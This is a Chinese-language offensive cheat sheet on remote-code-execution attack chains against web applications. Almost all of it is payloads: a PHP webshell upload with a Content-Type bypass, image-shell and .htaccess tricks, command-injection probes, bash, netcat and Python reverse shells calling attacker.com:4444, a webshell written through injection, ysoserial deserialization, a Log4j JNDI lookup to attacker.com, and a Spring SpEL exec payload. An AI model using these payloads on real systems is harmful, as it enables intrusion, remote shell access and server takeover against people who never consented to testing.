# RCE攻击链

## 文件上传 → WebShell

### 1. 基础上穿

```
1. 上传.php文件
   Content-Disposition: form-data; name="file"; filename="shell.php"
   <?php system($_GET['cmd']); ?>

2. 绕过Content-Type
   Content-Type: image/jpeg

3. 访问Shell
   http://target/uploads/shell.php?cmd=whoami
```

### 2. 图片马利用

```bash
# 生成图片马
copy 1.jpg /b + shell.php /b shell.jpg

# 上传后包含
?page=upload/shell.jpg
```

### 3. .htaccess利用

```
# 上传.htaccess
AddType application/x-httpd-php .jpg
<FilesMatch "jpg">
SetHandler application/x-httpd-php
</FilesMatch>

# 上传shell.jpg
```

---

## 命令注入 → 反弹Shell

### 1. 基础测试

```
; whoami
| id
& whoami
```

### 2. 反弹Shell

```bash
# Bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Netcat
nc -e /bin/sh attacker.com 4444

# Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(["/bin/sh","-i"])'
```

### 3. 写入WebShell

```
; echo '<?php system($_GET["cmd"]);?>' > /var/www/html/shell.php
```

---

## 反序列化 → RCE

### PHP反序列化

```
# 生成Payload
php -r 'echo serialize(new User("admin","cmd"));'

# 触发
 unserialize($_POST['data'])
```

### Java反序列化

```
# 使用ysoserial
java -jar ysoserial.jar CommonsCollections1 "command" > payload.ser
```

---

## 框架漏洞 → RCE

### Log4j

```
${jndi:ldap://attacker.com/Exploit}
```

### Spring SpEL

```
${T(java.lang.Runtime).getRuntime().exec('id')}
```

---

## 攻击链速查

| 阶段 | 方法 | 关键步骤 |
|------|------|----------|
| 获取入口 | 文件上传/命令注入/反序列化 | 绕过过滤 |
| 反弹Shell | Bash/Netcat/Python | 目标有出网能力 |
| 写WebShell | 文件写入 | 获取路径 |
